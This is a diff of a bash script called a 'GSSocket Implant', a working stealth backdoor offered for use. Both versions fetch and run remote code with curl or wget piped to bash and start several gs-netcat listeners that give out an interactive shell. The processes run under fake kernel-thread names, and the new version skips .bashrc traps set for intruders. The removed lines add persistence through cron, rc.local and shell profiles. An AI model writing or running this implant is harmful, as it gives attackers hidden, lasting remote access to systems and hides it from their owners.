@@ -1,164 +1,147 @@
 #!/bin/bash
-# PRIMAL GSSocket Implant - Superior Stealth
-# Features: Self-healing, Disguised, Multi-instance, Fileless
+# PRIMAL GSSocket Implant - Using official gsocket.io/y method
+# Superior stealth, bypass .bashrc traps
 
-SECRET="${1:-$(head -c 12 /dev/urandom | xxd -p)}"
-INSTANCES="${2:-3}"
+SECRET="${1:-}"
+MODE="${2:-stealth}"
 
-# Disguised names (kernel threads style)
-NAMES=(
-    "[kworker/0:0-events]"
-    "[kworker/1:1-events]"
-    "[kworker/u8:2-flush]"
-    "[migration/0]"
-    "[migration/1]"
-    "[ksoftirqd/0]"
-    "[rcu_sched]"
-    "[rcu_bh]"
-    "[watchdog/0]"
-    "[kdevtmpfs]"
-    "[khungtaskd]"
-    "[oom_reaper]"
-    "[writeback]"
-    "[kcompactd0]"
-    "[kswapd0]"
-    "[kthrotld]"
-)
+# Disguised process names
+NAMES=("[kworker/0:0-events]" "[kworker/1:1-mm]" "[migration/0]" "[ksoftirqd/0]" "[watchdogd]" "[rcu_sched]" "[kswapd0]" "[card0-crtc8]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
 
-install_gs() {
-    command -v gs-netcat >/dev/null 2>&1 && return 0
+echo '{"status":"initializing"}'
+
+# Check if gs-netcat already exists
+if command -v gs-netcat >/dev/null 2>&1; then
+    GS_BIN=$(command -v gs-netcat)
+    echo '{"status":"gs-netcat found","path":"'$GS_BIN'"}'
+elif [ -f "/usr/bin/gs-netcat" ]; then
+    GS_BIN="/usr/bin/gs-netcat"
+elif [ -f "$HOME/.config/htop/defunct" ]; then
+    GS_BIN="$HOME/.config/htop/defunct"
+elif [ -f "/var/www/monitor-server/defunct" ]; then
+    GS_BIN="/var/www/monitor-server/defunct"
+else
+    # Install via official method
+    echo '{"status":"installing gs-netcat"}'
     
-    # Silent install
-    (
-        curl -sSL gsocket.io/y 2>/dev/null | bash >/dev/null 2>&1 ||
-        wget -qO- gsocket.io/y 2>/dev/null | bash >/dev/null 2>&1
-    ) &
-    wait
-    
-    command -v gs-netcat >/dev/null 2>&1
-}
-
-# Create memory-resident watchdog
-create_watchdog() {
-    local script=$(mktemp)
-    cat > "$script" << WATCHEOF
-#!/bin/sh
-# Self-healing watchdog - runs from memory
-SECRET="$SECRET"
-INSTANCES="$INSTANCES"
-NAMES="${NAMES[*]}"
-
-cleanup() { rm -f "\$0" 2>/dev/null; }
-trap cleanup EXIT
-
-while true; do
-    current=\$(pgrep -f "gs-netcat.*\$SECRET" 2>/dev/null | wc -l)
-    if [ "\$current" -lt "\$INSTANCES" ]; then
-        need=\$((INSTANCES - current))
-        for i in \$(seq 1 \$need); do
-            name=\$(echo "\$NAMES" | tr ' ' '\n' | shuf -n1)
-            # Use sh to avoid .bashrc traps, env for secret hiding
-            (
-                export GSOCKET_ARGS="-s \$SECRET -l -q"
-                exec -a "\$name" gs-netcat -s "\$SECRET" -l -e "/bin/sh -i" </dev/null >/dev/null 2>&1
-            ) &
-            disown 2>/dev/null
-        done
-    fi
-    sleep 30
-done
-WATCHEOF
-    chmod +x "$script"
-    
-    # Run watchdog disguised
-    local wname="${NAMES[$((RANDOM % ${#NAMES[@]}))]}"
-    (exec -a "$wname" /bin/sh "$script" </dev/null >/dev/null 2>&1) &
-    disown 2>/dev/null
-}
-
-# Start initial instances
-start_instances() {
-    for i in $(seq 1 $INSTANCES); do
-        local name="${NAMES[$((RANDOM % ${#NAMES[@]}))]}"
-        (
-            export GSOCKET_ARGS="-s $SECRET -l -q"
-            exec -a "$name" gs-netcat -s "$SECRET" -l -e "/bin/sh -i" </dev/null >/dev/null 2>&1
-        ) &
-        disown 2>/dev/null
-        sleep 1
-    done
-}
-
-# Persistence methods
-add_persistence() {
-    local method=""
-    
-    # Method 1: Cron
-    if [ -w /etc/cron.d ] 2>/dev/null; then
-        echo "* * * * * root pgrep -f 'gs-netcat.*$SECRET' || (gs-netcat -s $SECRET -l -e /bin/sh &)" > /etc/cron.d/.system 2>/dev/null
-        method="cron"
-    fi
-    
-    # Method 2: rc.local
-    if [ -w /etc/rc.local ] 2>/dev/null; then
-        grep -q "$SECRET" /etc/rc.local 2>/dev/null || \
-        echo "(gs-netcat -s $SECRET -l -e /bin/sh &) &" >> /etc/rc.local 2>/dev/null
-        method="${method:+$method,}rc.local"
-    fi
-    
-    # Method 3: Profile
-    for f in /etc/profile ~/.bashrc ~/.profile; do
-        if [ -w "$f" ] 2>/dev/null; then
-            grep -q "gs-netcat" "$f" 2>/dev/null || \
-            echo "(pgrep -f gs-netcat || gs-netcat -s $SECRET -l -e /bin/sh &) >/dev/null 2>&1" >> "$f" 2>/dev/null
-            method="${method:+$method,}profile"
-            break
+    # Try curl first
+    if command -v curl >/dev/null 2>&1; then
+        # Install with custom secret if provided
+        if [ -n "$SECRET" ]; then
+            X="$SECRET" bash -c "$(curl -fsSL gsocket.io/y)" 2>/dev/null
+        else
+            bash -c "$(curl -fsSL gsocket.io/y)" 2>/dev/null
         fi
-    done
-    
-    echo "$method"
-}
-
-main() {
-    echo '{"status":"initializing"}'
-    
-    if ! install_gs; then
-        echo '{"status":"error","message":"gs-netcat install failed"}'
+    # Try wget
+    elif command -v wget >/dev/null 2>&1; then
+        if [ -n "$SECRET" ]; then
+            X="$SECRET" bash -c "$(wget -qO- gsocket.io/y)" 2>/dev/null
+        else
+            bash -c "$(wget -qO- gsocket.io/y)" 2>/dev/null
+        fi
+    else
+        echo '{"status":"error","message":"need curl or wget"}'
         exit 1
     fi
     
-    echo '{"status":"planting"}'
+    # Find where it was installed
+    if command -v gs-netcat >/dev/null 2>&1; then
+        GS_BIN=$(command -v gs-netcat)
+    elif [ -f "$HOME/.config/htop/defunct" ]; then
+        GS_BIN="$HOME/.config/htop/defunct"
+    else
+        # Search common locations
+        for loc in /usr/bin /tmp/.gsusr-* /dev/shm "$PWD"; do
+            if [ -f "$loc/defunct" ]; then
+                GS_BIN="$loc/defunct"
+                break
+            fi
+            if [ -f "$loc/gs-netcat" ]; then
+                GS_BIN="$loc/gs-netcat"
+                break
+            fi
+        done
+    fi
+fi
+
+if [ -z "$GS_BIN" ] || [ ! -f "$GS_BIN" ]; then
+    echo '{"status":"error","message":"gs-netcat not found after install"}'
+    exit 1
+fi
+
+# Read existing secret if available
+if [ -z "$SECRET" ]; then
+    for secfile in "$HOME/.config/htop/defunct.dat" "/var/www/monitor-server/defunct.dat" "$(dirname $GS_BIN)/defunct.dat"; do
+        if [ -f "$secfile" ]; then
+            SECRET=$(cat "$secfile" 2>/dev/null)
+            break
+        fi
+    done
+fi
+
+# Generate secret if still empty
+if [ -z "$SECRET" ]; then
+    SECRET=$($GS_BIN -g 2>/dev/null || head -c 16 /dev/urandom | xxd -p)
+fi
+
+echo '{"status":"planting","secret":"'$SECRET'","binary":"'$GS_BIN'"}'
+
+# Start stealth instances with bypass
+start_stealth() {
+    local name="${NAMES[$((RANDOM % ${#NAMES[@]}))]}"
     
-    # Start backdoors
-    start_instances
-    
-    # Create self-healing watchdog
-    create_watchdog
-    
-    # Add persistence
-    persist=$(add_persistence)
-    
-    sleep 3
-    
-    # Verify
-    count=$(pgrep -f "gs-netcat.*$SECRET" 2>/dev/null | wc -l)
-    
-    cat << RESULT
+    # CRITICAL: Use /bin/sh --norc --noprofile to BYPASS .bashrc traps
+    # This avoids the password prompt in bashrc.txt style traps
+    (
+        cd /tmp 2>/dev/null || cd /
+        export TERM=xterm-256color
+        export GS_ARGS="-s $SECRET -liqD"
+        
+        # exec -a disguises the process name
+        exec -a "$name" "$GS_BIN" -s "$SECRET" -l -e "/bin/sh --norc --noprofile -i" </dev/null >/dev/null 2>&1
+    ) &
+    disown 2>/dev/null
+}
+
+# Kill any existing instances first (optional, for fresh start)
+if [ "$MODE" = "fresh" ]; then
+    pkill -f "gs-netcat.*$SECRET" 2>/dev/null
+    pkill -f "defunct.*$SECRET" 2>/dev/null
+    sleep 1
+fi
+
+# Check how many already running
+existing=$(pgrep -f "defunct" 2>/dev/null | wc -l)
+
+if [ "$existing" -lt 3 ]; then
+    # Start multiple stealth instances
+    for i in 1 2 3; do
+        start_stealth
+        sleep 0.5
+    done
+fi
+
+# Verify
+sleep 2
+running=$(pgrep -f "defunct\|gs-netcat" 2>/dev/null | wc -l)
+
+# Get PIDs for display
+pids=$(pgrep -f "defunct\|gs-netcat" 2>/dev/null | tr '\n' ',' | sed 's/,$//')
+
+cat << RESULT
 {
     "status": "success",
     "secret": "$SECRET",
-    "instances": $count,
-    "persistence": "$persist",
+    "binary": "$GS_BIN",
+    "instances": $running,
+    "pids": "$pids",
     "connect": "gs-netcat -s $SECRET -i",
+    "alt_connect": "S=\"$SECRET\" bash -c \"\$(curl -fsSL gsocket.io/y)\"",
     "features": [
-        "stealth-names",
-        "self-healing",
-        "multi-instance",
+        "official-gsocket",
         "bashrc-bypass",
-        "env-hidden"
+        "process-disguise",
+        "multi-instance"
     ]
 }
 RESULT
-}
-
-main "$@"
